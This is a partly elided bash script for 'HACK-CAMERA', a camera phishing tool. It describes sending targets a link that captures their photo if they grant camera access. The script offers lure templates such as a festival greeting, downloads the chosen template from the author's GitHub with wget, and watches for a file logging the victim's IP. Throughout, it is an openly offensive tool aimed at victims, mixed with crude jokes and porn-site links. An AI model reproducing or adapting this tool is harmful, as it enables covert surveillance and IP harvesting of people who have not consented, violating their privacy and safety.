...
# HACK-CAMERA 
# Version    : 2.1
# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to target, if he/she gives access to camera, his/her photo will be captured!
# Author     : X PHANTOM PH4N70M
# Github     : https://github.com/SecretCompany777
# Date       : 29-05-2022
...
\033[1;30m           ▄▄███████████████████████▄▄
          ...
          ▄██████████▓▄▄▄▄▄▓██████████▄
        ▄████████████▓▄▄▄▄▄▓████████████▄   
\033[1;32m          乂 S E C R E T  D I  R A J A
"
...
netcheck() {
    while true; do
        ...
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet Bro!\007\n"
            sleep 2
        else
            break
        fi
...
trap "echo -e '\n${success}Terima Kasih atas penggunaan tools kami! Visit Site : https://pornhub.com\n'; exit" 2

# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang secret_camera.sh
termux=true
else
termux=false
fi
...
if [ `command -v apt` ]; then
    ...
    echo -e "${error}No supported package manager found! Install packages secara manual!\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
...
sleep 1
printf "${cyan}\nS E C R E T${nc}乂${blue}D I R A J A ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nS E C R E T${nc}@${blue}D I R A J A ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HIJACK-CAMERA]
$red[Version]    ${cyan} :[2.1]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[乂 S E C R E T  D I R A J A]
$red[Github]     ${cyan} :[https://github.com/SecretCompany777] 
$red[Join us]    ${cyan} :[https://pornhub.com]
$red[Telegarm]   ${cyan} :[https://t.me/secretcompany0]"
printf "${cyan}\nS E C R E T${nc}乂${cyan}D I R A J A ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://pornhub.com"
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/SecretCompany777/files/raw/main/${dir}.zip"
...
if $termux; then
echo -e "\n${info}Andai anda membuka Hotspot sila tutup dan pergi mampos!"
sleep 3
fi
...
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target to die. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link haha!\n"
